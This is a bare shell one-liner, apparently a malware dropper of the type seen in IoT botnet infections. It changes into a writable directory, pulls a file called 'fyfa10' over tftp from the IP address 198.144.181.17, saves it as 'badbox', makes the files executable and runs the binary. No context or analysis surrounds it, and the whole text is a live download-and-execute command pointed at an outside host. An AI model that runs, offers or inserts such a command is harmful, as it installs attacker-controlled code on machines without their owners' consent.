cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 198.144.181.17 -c get fyfa10;cat fyfa10 >badbox;chmod +x *;./badbox
